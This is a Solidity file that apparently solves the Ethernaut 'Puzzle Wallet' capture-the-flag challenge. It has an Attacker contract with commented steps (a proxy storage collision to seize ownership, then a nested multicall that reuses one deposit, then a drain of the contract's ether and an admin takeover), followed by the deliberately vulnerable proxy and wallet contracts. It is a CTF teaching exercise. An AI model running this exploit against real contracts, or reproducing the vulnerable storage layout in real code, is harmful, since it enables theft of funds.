// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//We are calling the proxy contract which calls the implementation contract
interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract Attacker {
    IPuzzleWallet public immutable puzzleWallet;

    constructor(IPuzzleWallet _puzzleWallet) {
        puzzleWallet = IPuzzleWallet(_puzzleWallet);
    }

    function attack() public {
        require(msg.sender == address(0x92B7c57F0E82a5f337A0e2E26465f8bc20F6c895), "Wrong msg.sender");
        //1. Overwrite owner storage by calling propseNewAdmin - now Attacke is the new owner
        puzzleWallet.proposeNewAdmin(address(this));
        //2. Now with owner rights I can add the Attacker to the white list
        puzzleWallet.addToWhitelist(address(this));

        //3. To be able to call setMaxBalance we should get all of the eth of the implementation(wallet) contract

        //call multicall
        // 1. deposit
        // 2. multicall
        //      deposit
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, deposit_data);

        //in the data we will call deposit which will deposit 0.001 ether - calling deposit with deposit_data
        //then in data[1] we will call multicall again with deposit_data, which will bypass the check, so we will make two deposits by only sending 0.001 ether
        puzzleWallet.multicall{value: 0.001 ether}(data);

        //4. after this is executed our balance in the contract would be 0.002 ether, although we have only deposited 0.001 ether

        //5. call execute to withdraw the 0.001 ether you have deposited and the initial 0.001 ether of the contracts balance
        // withdraw
        puzzleWallet.execute(msg.sender, 0.002 ether, "");

        //6. Change the admin to msg.sender (which is my wallet's address)
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));
        require(puzzleWallet.admin() == msg.sender, "hack failed");
        (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Sending ETH failed!");
    }
}

//========================================

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface IPuzzleProxy {
    function proposeNEwAdmin(address _newAdmin) external;
}

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
